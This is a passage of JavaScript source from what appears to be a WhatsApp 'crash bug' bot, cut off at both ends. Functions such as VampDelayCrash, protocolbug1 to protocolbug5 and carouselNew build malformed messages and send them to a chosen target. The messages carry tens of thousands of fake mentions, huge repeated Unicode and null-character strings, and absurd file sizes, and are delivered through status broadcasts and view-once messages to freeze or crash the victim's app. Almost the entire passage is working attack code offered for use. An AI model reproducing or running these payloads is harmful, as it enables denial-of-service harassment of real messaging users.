          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await langgxyz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampDelayCrash(langgxyz, target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Sasuke Crash 🐍 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await langgxyz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampBroadcast(langgxyz, target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Sasuke Crash 🐍 🐍 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await langgxyz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Sasuke Crash 🐍 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


        // Func Protocol 
async function protocolbug1(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Ciee Kena Bug ya??",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( Script Sasuke Gen 7 )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await langgxyz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await langgxyz.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 *Athena* - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
  }
    
    async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  Sasuke - Is Heree🐍\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

  async function protocolbug5v2(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga || Beginner" + longUnicode,
        title: "SasukeCrashh🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://instagram.com/_u/tamainfinity_",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
        
async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));
    
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Sasuke Crash 🐍〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "Erlangga? Come Heree!!!🐍〽"
                        }
                    },
                    description: "Erlangga?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}


// Func Neww!!
async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga Come Heree!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Erlanggaa?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}


async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "Erlangga" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Sasuke New Gen 7 ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await langgxyz.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("Sasuke Sending Carousel New !!");
  }
}
        
// Func Buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
